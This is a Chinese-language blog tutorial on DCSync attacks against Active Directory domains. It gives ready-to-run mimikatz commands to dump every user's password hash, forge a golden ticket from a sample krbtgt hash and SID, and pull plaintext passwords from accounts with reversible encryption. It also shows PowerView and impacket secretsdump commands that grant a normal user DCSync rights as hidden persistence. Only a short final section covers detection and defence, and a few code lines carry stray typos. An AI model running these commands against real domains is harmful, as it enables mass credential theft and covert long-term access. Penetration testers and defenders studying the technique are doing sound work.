**目录**

[DCSync](#t0 "DCSync")

[利用DCSync导出域内所有用户Hash](#t1 "利用DCSync导出域内所有用户Hash")

[使用黄金票据+DCSync导出域内所有用户的Hash](#t2 "使用黄金票据+DCSync导出域内所有用户的Hash")

[dcsync获取明文密码](#t3 "dcsync获取明文密码")

[使用DCSync权限维持](#t4 "使用DCSync权限维持")

[DCSync攻击检测与防御](#t5 "DCSync攻击检测与防御")

* * *

DCSync
------

在域中，不同的DC之间，每隔15分钟会进行一次域数据的同步。当一个DC（辅助DC）想从其他DC（主DC）获取数据时，辅助DC会向主DC发起一个GetNCChanges请求。请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用的这个原理，通过Directory Replication Service(DRS)服务的GetNCChanges接口向域控发起数据同步请求。

在DCSync功能出现之前，要想获得域用户的[哈希](https://so.csdn.net/so/search?q=%E5%93%88%E5%B8%8C&spm=1001.2101.3001.7020)，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。2015年8月，新版的mimikatz增加了DCSync的功能，该功能可以模仿一个域控DC，从真实的域控中请求数据，如用户的哈希。该功能最大的特点就是可以实现不登录到域控而获取域控上的数据。

### 利用DCSync导出域内所有用户Hash

利用条件：获得以下任一的权限

*   Administrators组内的用户
*   Domain Admins组内的用户
*   Enterprise Admins组内的用户
*   域控制器的计算机帐户

```
privilege::debug       
#导出指定用户的信息(包括哈希)      
lsadump::dcsync /domain:xie.com /user:administrator           
lsadump::dcsync /domain:xie.com /user:administrator  /csv         
#导出所有用户的信息(包括哈希)      
lsadump::dcsync /domain:xie.com /all          
lsadump::dcsync /domain:xie.com /all /csv
```


![](https://img-blog.csdnimg.cn/20201010113349720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 使用黄金票据+DCSync导出域内所有用户的Hash

前提是知道krbtgt用户的hash和域的sid。

*   krbtgt用户的哈希为：9ce0b40ed1caac7523a22d574b32deb2
*   域sid为：S-1-5-21-2189311154-2766837956-1982445477

我们在域内的一台普通主机上，以本地管理员权限登录执行mimikatz。或者在非域内的机器上，以本地管理员权限执行mimikatz，但是该机器的DNS服务器需设置为域控的ip。

```
#提权      
privilege::debug       
#生成黄金票据并导入      
kerberos::golden /user:administrator /domain:xie.com /sid:S-1-5-21-2189311154-2766837956-1982445477 /krbtgt:9ce0b40ed1caac7523a22d574b32deb2 /ptt       
#查看票据      
kerberos::list       1
#导出administrator用户的哈希      1
lsadump::dcsync /domain:xie.com /user:administrator  /csv
```


![](https://img-blog.csdnimg.cn/20201010130803306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

相关文章：[票据传递攻击(Pass the Ticket,PtT)](https://xie1997.blog.csdn.net/article/details/92843080 "票据传递攻击(Pass the Ticket,PtT)")

### dcsync获取明文密码

有时候使用dcsync可以获取明文密码，这是因为帐户内使用可逆加密存储密码属性的关系，勾选这个属性后，用户再次更改密码会显示其明文密码，

当通过远程访问Internet身份验证服务（IAS）或使用CHAP（质询握手身份验证协议）身份验证时，必须启用使用可逆加密存储密码。 在Internet信息服务（IIS）中使用摘要式身份验证时，也需要启动此项。

powershell查找域内所有使用可逆加密存储的帐户

```
Get-ADUser  -Filter  ‘useraccountcontrol  -band  128’  -Properties useraccountcontrol  | Format-Table name, samaccountname,useraccountcontrol
```


**有几种方式可以来进行此项的修改：**

1、通过组策略

策略——> Windows设置——>安全性设置——>帐户策略——>密码策略——>使用可逆加密存储密码

2、通过使用Active Directory管理中心添加system项中Password Settings Container项内的密码策略，然后将其应用至指定组即可

![](https://img-blog.csdnimg.cn/20210221221842128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

3、更改帐户的属性，勾选使用可逆加密存储密码选项

![](https://img-blog.csdnimg.cn/20210221221824431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

使用ldap条件勾选其使用可逆加密存储属性的帐户

```
get-adobject -ldapfilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=128))"       
Set-ADUser test -AllowReversiblePasswordEncryption $true
```


### 使用DCSync权限维持

当我们获得了域内管理员权限，如果我们能修改域内普通用户的权限，使其具有DCSync权限的话，那么普通域用户也能导出域内用户的哈希了！这样可以做一个隐蔽的权限维持！

那么如何修改域内普通用户的权限，使其具有DCSync权限呢？如下，向域内普通用户添加如下两条ACE(Access Control Entries)：

*   DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
*   DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

我们可以使用Empire下的 powerview.ps1 脚本执行命令添加以上两条ACE。

```
#给域用户hack添加以上三条ACE      
Add-DomainObjectAcl -TargetIdentity "DC=xie,DC=com" -PrincipalIdentity hack -Rights DCSync -Verbose       
#给域用户hack删除以上三条ACE      
Remove-DomainObjectAcl -TargetIdentity "DC=xie,DC=com" -PrincipalIdentity hack -Rights DCSync -Verbose
```


![](https://img-blog.csdnimg.cn/20201012170317436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**impacket攻击**

攻击机Kali可以不在域中

```
./secretsdump.py xie/hack:password@192.168.10.131 -dc-ip 192.168.10.131 -just-dc-user administrator
```


![](https://img-blog.csdnimg.cn/20201010144409411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**mimikatz攻击** 

然后以hack用户登录域内主机(hack用户需要在该机器上是本地管理员权限，因为要执行mimikatz提权)，执行DCSync命令导出域内用户的哈希。

```
lsadump::dcsync /domain:xie.com /user:administrator  /csv
```


![](https://img-blog.csdnimg.cn/2020101014372311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### DCSync攻击检测与防御

*   DCSync攻击检测：可以在网络设备上检测来自白名单以外的域控制器数据同步复制。
*   DCSync防御：给域控设置白名单，只允许白名单内的域控IP发起数据同步请求。

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[dcsync获取明文密码](https://app.yinxiang.com/fx/4073d2c1-79c9-41fe-bdee-0b9fd5a365e1 "dcsync获取明文密码")